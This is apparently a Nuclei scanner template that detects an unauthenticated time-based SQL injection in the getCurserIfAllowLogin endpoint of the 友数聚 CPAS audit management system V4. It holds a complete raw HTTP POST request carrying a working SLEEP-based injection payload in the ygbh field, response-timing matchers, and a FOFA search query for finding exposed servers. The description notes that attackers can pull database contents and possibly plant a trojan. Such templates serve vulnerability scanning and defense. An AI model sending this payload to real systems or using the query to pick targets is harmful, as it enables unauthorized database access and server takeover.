id: youdatasum-getCurserIfAllowLogin-sqli

info:
  name: 友数聚 CPAS 审计管理系统 V4 getCurserIfAllowLogin - sqli
  author: leadlife
  severity: high
  description: 友数聚 CPAS审计管理系统V4 getCurserIfAllowLogin 接口存在SQL注入，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference: 
    - https://github.com/wy876/POC/blob/main/%E5%8C%97%E4%BA%AC%E5%8F%8B%E6%95%B0%E8%81%9A%E7%A7%91%E6%8A%80/CPAS%E5%AE%A1%E8%AE%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FgetCurserIfAllowLogin%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: icon_hash="-58141038" || body="/cpasm4/static/cap/font/iconfont.css"

  tags: year,sqli,time,youdatasum

http:
  - raw:  
      - |
        @timeout: 15s
        POST /cpasm4/cpasList/getCurserIfAllowLogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept: text/plain, */*; q=0.01

        ygbh=q' AND (SELECT 1635 FROM (SELECT(SLEEP(6)))mlQT) AND 'qoYJ'='qoYJ
      
    matchers:
      - type: dsl
        dsl:
          - contains_all(header,'big5','text/plain')
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and